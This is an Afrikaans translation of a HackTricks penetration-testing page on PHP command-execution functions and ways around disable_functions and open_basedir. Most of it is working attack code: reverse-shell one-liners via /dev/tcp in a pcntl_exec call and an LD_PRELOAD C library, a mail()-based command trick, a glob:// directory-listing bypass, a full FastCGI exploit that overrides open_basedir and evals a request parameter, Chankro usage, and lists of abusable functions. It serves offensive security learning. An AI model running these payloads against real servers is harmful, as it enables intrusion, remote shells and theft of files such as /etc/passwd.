# PHP - Nuttige Funksies & disable\_functions/open\_basedir omseiling

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## PHP Opdrag & Kode Uitvoering

### PHP Opdrag Uitvoering

**Nota:** 'n [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell kan **outomaties** die volgende funksie nagaan en omseil as sommige daarvan gedeaktiveer is.

**exec** - Gee die laaste lyn van die opdragte se uitvoer
```bash
echo exec("uname  -a");
```
**passthru** - Stuur die opdragte se uitvoer direk na die blaaier
```bash
echo passthru("uname -a");
```
**stelsel** - Stuur opdragte se uitvoer direk na die blaaier en keer laaste lyn terug
```bash
echo system("uname -a");
```
**shell\_exec** - Gee die uitvoer van opdragte terug
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Dieselfde as shell\_exec()
```bash
echo `uname -a`
```
**popen** - Maak 'n lees- of skryfpyp na die proses van 'n opdrag oop
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc\_open** - Soortgelyk aan popen() maar met 'n groter mate van beheer
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg\_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl\_exec** - Voer 'n program uit (per standaard in moderne en nie-so-moderne PHP moet jy die `pcntl.so` module laai om hierdie funksie te gebruik)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb\_send\_mail** - Hierdie funksie word gebruik om e-posse te stuur, maar dit kan ook misbruik word om arbitr√™re opdragte binne die `$options` parameter in te voeg. Dit is omdat die **php `mail` funksie** gewoonlik die `sendmail` binaire binne die stelsel aanroep en dit jou toelaat om **bykomende opsies** in te voeg. Jy sal egter nie die uitvoer van die uitgevoerde opdrag kan sien nie, so dit word aanbeveel om 'n shell-skrip te skep wat die uitvoer na 'n l√™er skryf, dit met mail uit te voer, en die uitvoer te druk:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Hierdie funksie kan gebruik word om 'n PHP-uitbreiding dinamies te laai. Hierdie funksie sal nie altyd teenwoordig wees nie, so jy moet kyk of dit beskikbaar is voordat jy probeer om dit te benut. Lees [hierdie bladsy om te leer hoe om hierdie funksie te benut](disable\_functions-bypass-dl-function.md).

### PHP Kode Uitvoering

Afgesien van eval is daar ander maniere om PHP-kode uit te voer: include/require kan gebruik word vir afstandkode-uitvoering in die vorm van Local File Include en Remote File Include kwesbaarhede.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable\_functions & open\_basedir

**Gedisableerde funksies** is die instelling wat in `.ini` l√™ers in PHP gekonfigureer kan word wat die gebruik van die aangeduide **funksies** **verbied**. **Open basedir** is die instelling wat aan PHP aandui watter vouer dit kan toegang h√™.\
Die PHP instelling moet gekonfigureer word in die pad _/etc/php7/conf.d_ of soortgelyk.

Beide konfigurasies kan in die uitvoer van **`phpinfo()`** gesien word:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (493).png>)

## open\_basedir Bypass

`open_basedir` sal die vouers konfigureer wat PHP kan toegang h√™, jy **sal nie in staat wees om enige l√™er buite** daardie vouers te skryf/lees/uit te voer nie, maar jy **sal selfs nie in staat wees om** ander gidsen te lys nie.\
As jy egter op een of ander manier in staat is om arbitr√™re PHP-kode uit te voer, kan jy **probeer** die volgende stuk **kode** om te probeer om die beperking te **omseil**.

### Lys gidsen met glob:// omseiling

In hierdie eerste voorbeeld word die `glob://` protokol met 'n paar pad omseilings gebruik:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Nota1**: In die pad kan jy ook `/e??/*` gebruik om `/etc/*` en enige ander gids te lys.\
**Nota2**: Dit lyk of 'n deel van die kode gedupliseer is, maar dit is eintlik nodig!\
**Nota3**: Hierdie voorbeeld is slegs nuttig om gidse te lys, nie om l√™ers te lees nie.

### Volledige open\_basedir omseiling deur FastCGI te misbruik

As jy **meer oor PHP-FPM en FastCGI wil leer** kan jy die [eerste afdeling van hierdie bladsy](disable\_functions-bypass-php-fpm-fastcgi.md) lees.\
As **`php-fpm`** geconfigureer is, kan jy dit misbruik om **open\_basedir** heeltemal te omseil:

![](<../../../../.gitbook/assets/image (545).png>)

![](<../../../../.gitbook/assets/image (577).png>)

Let daarop dat die eerste ding wat jy moet doen is om te vind waar die **unix socket van php-fpm** is. Dit is gewoonlik onder `/var/run`, so jy kan **die vorige kode gebruik om die gids te lys en dit te vind**.\
Kode van [hier](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
Hierdie skripte sal kommunikeer met die **unix socket van php-fpm** (gewoonlik gele√´ in /var/run as fpm gebruik word) om arbitr√™re kode uit te voer. Die `open_basedir` instellings sal oorgeskryf word deur die **PHP\_VALUE** attribuut wat gestuur word.\
Let op hoe `eval` gebruik word om die PHP kode wat jy binne die **cmd** parameter stuur, uit te voer.\
Let ook op die **gekommenteerde lyn 324**, jy kan dit ontkommentarieer en die **payload sal outomaties met die gegewe URL verbind en die PHP kode** wat daar bevat is, uitvoer.\
Toegang net tot `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` om die inhoud van die `/etc/passwd` l√™er te kry.

{% hint style="warning" %}
Jy mag dalk dink dat net soos ons die `open_basedir` konfigurasie oorgeskryf het, ons ook **`disable_functions`** kan **oorgeskryf**. Wel, probeer dit, maar dit sal nie werk nie, blykbaar kan **`disable_functions` slegs in 'n `.ini` php** konfigurasiel√™er gekonfigureer word en die veranderinge wat jy met PHP\_VALUE maak, sal nie effektief wees op hierdie spesifieke instelling.
{% endhint %}

## disable\_functions Bypass

As jy daarin slaag om PHP kode binne 'n masjien uit te voer, wil jy waarskynlik na die volgende vlak gaan en **arbitr√™re stelselinstruksies uitvoer**. In hierdie situasie is dit gewoonlik om te ontdek dat die meeste of al die PHP **funksies** wat toelaat om **stelselinstruksies uit te voer, gedeaktiveer is** in **`disable_functions`.**\
Kom ons kyk hoe jy hierdie beperking kan omseil (as jy kan)

### Outomatiese omseiling ontdekking

Jy kan die hulpmiddel [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) gebruik en dit sal jou aandui watter funksie (indien enige) jy kan gebruik om **`disable_functions`** te **omseil**.

### Omseiling met ander stelselfunksies

Keer net terug na die begin van hierdie bladsy en **kyk of enige van die funksies wat opdragte uitvoer nie gedeaktiveer is en beskikbaar is in die omgewing**. As jy net 1 van hulle vind, sal jy dit kan gebruik om arbitr√™re stelselinstruksies uit te voer.

### LD\_PRELOAD omseiling

Dit is goed bekend dat sommige funksies in PHP soos `mail()` gaan **binaries binne die stelsel uitvoer**. Daarom kan jy hulle misbruik deur die omgewingsvariabele `LD_PRELOAD` te gebruik om hulle 'n arbitr√™re biblioteek te laat laai wat enigiets kan uitvoer.

#### Funksies wat gebruik kan word om disable\_functions met LD\_PRELOAD te omseil

* **`mail`**
* **`mb_send_mail`**: Effektief wanneer die `php-mbstring` module ge√Ønstalleer is.
* **`imap_mail`**: Werk as die `php-imap` module teenwoordig is.
* **`libvirt_connect`**: Vereis die `php-libvirt-php` module.
* **`gnupg_init`**: Bruikbaar met die `php-gnupg` module ge√Ønstalleer.
* **`new imagick()`**: Hierdie klas kan misbruik word om beperkings te omseil. Gedetailleerde uitbuitings tegnieke kan gevind word in 'n omvattende [**skrywe hier**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Jy kan [**hier vind**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) die fuzzing skrip wat gebruik is om daardie funksies te vind.

Hier is 'n biblioteek wat jy kan saamstel om die `LD_PRELOAD` omgewing veranderlike te misbruik:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypass using Chankro

In orde om hierdie miskonfigurasie te misbruik kan jy [**Chankro**](https://github.com/TarlogicSecurity/Chankro) gebruik. Dit is 'n hulpmiddel wat 'n **PHP exploit** sal **genereer** wat jy na die kwesbare bediener moet oplaai en uitvoer (toegang dit via web).\
**Chankro** sal binne die slagoffer se skyf die **biblioteek en die omgekeerde skulp** wat jy wil uitvoer skryf en sal die\*\*`LD_PRELOAD` truuk + PHP `mail()`\*\* funksie gebruik om die omgekeerde skulp uit te voer.

Let daarop dat om **Chankro** te gebruik, `mail` en `putenv` **nie in die `disable_functions` lys mag verskyn nie**.\
In die volgende voorbeeld kan jy sien hoe om 'n **chankro exploit** te **skep** vir **arch 64**, wat `whoami` sal uitvoer en die uitset in _/tmp/chankro\_shell.out_ sal stoor, chankro sal **die biblioteek en die payload** in _/tmp_ skryf en die **finale exploit** gaan **bicho.php** genoem word (dit is die l√™er wat jy na die slagoffer se bediener moet oplaai):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

As jy vind dat die **mail** funksie geblokkeer is deur gedeaktiveerde funksies, kan jy steeds die funksie **mb\_send\_mail** gebruik.\
Meer inligting oor hierdie tegniek en Chankro hier: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" met PHP vermo√´ns

Let daarop dat jy met **PHP** **l√™ers kan lees en skryf, directories kan skep en toestemmings kan verander**.\
Jy kan selfs **databasisse dump**.\
Miskien kan jy met **PHP** die boks **enumerate** en 'n manier vind om voorregte te eskaleer/opdragte uit te voer (byvoorbeeld om 'n private ssh-sleutel te lees).

Ek het 'n webshell geskep wat dit baie maklik maak om hierdie aksies uit te voer (let daarop dat die meeste webshells jou ook hierdie opsies sal bied): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Modules/Weergawe afhanklike bypasses

Daar is verskeie maniere om disable\_functions te omseil as 'n spesifieke module gebruik word of om 'n spesifieke PHP weergawe te exploiteer:

* [**FastCGI/PHP-FPM (FastCGI Prosesbestuurder)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass met FFI - Buitelandse Funksie-Interface geaktiveer**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass via mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Uitbreiding Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl funksie**](disable\_functions-bypass-dl-function.md)
* [**Hierdie exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - exploitable met klein veranderinge aan die PoC
* 7.0 - alle weergawes tot op hede
* 7.1 - alle weergawes tot op hede
* 7.2 - alle weergawes tot op hede
* 7.3 - alle weergawes tot op hede
* 7.4 - alle weergawes tot op hede
* 8.0 - alle weergawes tot op hede
* [**Van 7.0 tot 8.0 exploit (slegs Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Outomatiese Gereedskap**

Die volgende skrip probeer sommige van die metodes wat hier bespreek is:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Ander Interessante PHP funksies

### Lys van funksies wat callbacks aanvaar

Hierdie funksies aanvaar 'n string parameter wat gebruik kan word om 'n funksie van die aanvaller se keuse aan te roep. Afhangende van die funksie mag die aanvaller al dan nie die vermo√´ h√™ om 'n parameter deur te gee nie. In daardie geval kan 'n Inligtingsontsluiting funksie soos phpinfo() gebruik word.

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Volgende lyste van hier](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Inligtingsontsluiting

Meeste van hierdie funksie-oproepe is nie sinke nie. Maar dit kan eerder 'n kwesbaarheid wees as enige van die data wat teruggestuur word, sigbaar is vir 'n aanvaller. As 'n aanvaller phpinfo() kan sien, is dit beslis 'n kwesbaarheid.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Ander
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Filesystem Functions

Volgens RATS is al die filesystem funksies in php sleg. Sommige hiervan lyk nie baie nuttig vir die aanvaller nie. Ander is nuttiger as wat jy dalk dink. Byvoorbeeld, as allow\_url\_fopen=On is, kan 'n url as 'n l√™er pad gebruik word, so 'n oproep na copy($\_GET\['s'], $\_GET\['d']); kan gebruik word om 'n PHP skrip enige plek op die stelsel op te laai. Ook, as 'n webwerf kwesbaar is vir 'n versoek wat via GET gestuur word, kan elkeen van daardie filesystem funksies misbruik word om 'n aanval na 'n ander gasheer deur jou bediener te kan lei.

**Open filesystem handler**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Skryf na l√™erstelsel (gedeeltelik in kombinasie met lees)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**Lees van l√™erstelsel**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
